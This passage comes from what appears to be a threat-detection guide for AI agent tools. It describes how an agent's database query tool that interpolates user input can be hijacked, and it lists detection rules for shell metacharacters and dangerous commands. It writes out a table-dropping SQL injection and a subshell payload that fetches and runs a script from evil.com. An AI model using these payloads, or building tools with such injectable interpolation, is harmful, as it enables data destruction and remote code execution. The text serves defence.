...
Scenario #2: An agent has a database query tool that constructs commands by interpolating user input: `psql -c "SELECT * FROM users WHERE name='${input}'"`. An attacker provides: `'; DROP TABLE users; --` (SQL injection) or `$(curl http://evil.com/shell.sh | bash)` (shell injection via subshell). The semicolon breaks out of the intended command, and the subshell executes an arbitrary download-and-execute chain. ATR-2026-00111 detects the shell metacharacters (`;`, `$()`, backticks, `&&`, `||`, `|`) followed by dangerous commands (curl, wget, bash, python, rm). ATR-2026-00066 (Parameter Injection) provides additional detection for SQL injection, path traversal, and template injection patterns in tool arguments.

**Reference Links:**

1. [ATR-2026-00110: Eval Injection](https://github.com/Agent-Threat-Rule/agent-threat-rules): Detects eval(), new Function(), vm.runInNewContext(), child_process, and sandbox escape primitives.
2. [ATR-2026-00111: Shell Metacharacter Injection](https://github.com/Agent-Threat-Rule/agent-threat-rules): 6 categories: semicolons, subshells, backticks, logical operators, pipes, null bytes.
